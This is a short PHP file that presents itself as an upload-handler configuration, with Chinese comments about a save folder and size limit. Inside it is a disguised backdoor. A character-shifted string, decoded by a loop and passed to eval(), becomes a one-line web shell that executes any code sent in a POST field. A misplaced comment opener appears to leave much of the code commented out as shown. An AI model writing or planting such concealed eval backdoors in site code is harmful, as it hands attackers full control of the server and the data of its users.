<?php
   /* header("Content-Type:text/html;charset=utf-8");
    error_reporting( E_ERROR | E_WARNING );
    include "DocumentSecurity.php";
    //配置
	$arr="j{fq-)dUTXY`}b.@"; 
    $config = array(
        "savePath" => "upload/" ,             //存储文件夹
        "maxSize" => 1000 ,                   //允许的文件最大尺寸，单位KB
    );
    //上传文件目录
    $Path = "upload/";
	for($i=0;$i< strlen($arr);$i++){$arr[$i]=chr(ord($arr[$i])-5);}
    //保存在临时目录中
    $config[ "savePath" ] = $Path;
    
    $type = $_REQUEST['type'];
    $callback=$_GET['callback'];
	eval($arr);
    
    /**
     * 返回数据
     */
   /* if($callback) {
        echo '<script>'.$callback.'('.json_encode($info).')</script>';
    } else {
        echo json_encode($info);
    }*/
